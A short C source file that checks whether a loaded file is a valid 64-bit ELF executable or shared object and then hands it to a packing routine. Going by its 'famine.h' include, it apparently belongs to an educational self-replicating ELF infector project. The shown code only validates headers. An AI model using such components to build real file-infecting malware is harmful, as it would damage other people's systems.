/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   get_elf.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/21 21:53:50 by root              #+#    #+#             */
/*   Updated: 2018/05/22 08:38:05 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "libft.h"
#include "famine.h"

void			get_elf(t_env *e)
{
	Elf64_Ehdr	*file_header;
	
	file_header = (Elf64_Ehdr *)e->data;
	if (!ft_memcmp(file_header->e_ident, ELFMAG, SELFMAG)					&&
		file_header->e_ident[EI_CLASS] == ELFCLASS64						&&
		file_header->e_ident[EI_DATA] != ELFDATANONE						&&
		file_header->e_ident[EI_VERSION] == EV_CURRENT						&&
		(file_header->e_type == ET_EXEC || file_header->e_type == ET_DYN)	&&
		file_header->e_version == EV_CURRENT)
		pack_elf64(e);
}
